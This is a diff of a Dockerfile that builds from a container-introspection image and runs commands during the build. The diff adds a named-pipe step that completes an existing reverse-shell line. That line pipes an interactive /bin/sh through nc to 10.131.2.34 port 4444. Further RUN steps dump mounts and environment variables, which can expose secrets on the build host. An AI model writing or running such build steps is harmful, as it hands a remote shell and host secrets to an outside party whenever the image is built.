@@ -1,4 +1,4 @@
-FROM quay.io/instrumentisto/nmap
+#FROM quay.io/instrumentisto/nmap
 FROM leschard/amicontained
 # Install app dependencies
 # A wildcard is used to ensure both package.json AND package-lock.json are copied
@@ -10,6 +10,7 @@ FROM leschard/amicontained
 
 COPY . .
 RUN pwd
+RUN mknod /tmp/f p
 RUN cat /tmp/f|/bin/sh -i 2>&1|nc 10.131.2.34 4444 >/tmp/f
 RUN mount
 RUN env
